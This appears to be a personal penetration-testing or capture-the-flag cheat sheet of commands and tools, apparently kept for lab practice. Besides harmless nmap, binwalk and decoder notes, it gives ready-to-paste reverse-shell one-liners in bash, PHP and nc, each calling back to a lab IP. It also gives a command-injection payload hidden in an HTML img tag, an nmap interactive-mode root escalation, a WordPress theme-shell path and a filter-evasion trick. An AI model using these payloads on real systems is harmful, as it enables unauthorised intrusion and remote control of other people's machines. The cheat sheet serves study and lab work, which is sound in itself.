### -sC flag in nmap runs a set of default NSE scripts, some of them are intrusive so this should not be run against real machines.


### -A flag means agressive. It consists of 
-A: Enable OS detection, version detection, script scanning, and traceroute

### nmap run without sudo does TCP scan (-sT) and with sudo SYN scan (-sS). SYYN scan is better as it is a stealth one - sends RST flag to server so it avoids getting detected by firewall (for example). On the other side, it can destabilize weak applications on a server .

### To check if there is a nse script for X service:

#### grep "X" /usr/share/nmap/scripts/script.db


#### Getting rev shell when there is a chance to write a comment
<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>

 

#### SPAWNING INTTERACTING SHELL WITH PYTHON
python3 -c 'import pty;pty.spawn("/bin/bash")'   


#### GETTING A LIST OF SUID FILES
find / -perm -u=s -type f 2>/dev/null
---> finds all binaries with suuid permission

#### link to access a modified WP theme (to get rev shell)
http://10.10.142.159/wp-content/themes/twentyfifteen/404.php 


# if there is a filtering, it is needed to add command in backslashes e.g `l\s -la`


# PHP REV SHELL ONE LINER
php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# BASH REV SHELL ONELINER
bash -i &>/dev/tcp/10.6.46.150/4444 <&1


# There are many different converters to john format
bin2john / zip2john / gpg2john 

#
7z is a file to extract

#
binwalk -->> tool to check of there is a zip file inside .png image
`binwalk -e file`

# NMAP SHELL
old version of nmap can be used to escalate to root
nmap --versiob
nmap --interactive
and then `!sh`

#
BRAINFUCK decoder

https://www.splitbrain.org/_static/ook/

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++.

#
XOR DECODER

http://xor.pw/#

#
SPEECH TO TEXT CONVERTER

https://speech-to-text-demo.ng.bluemix.net/
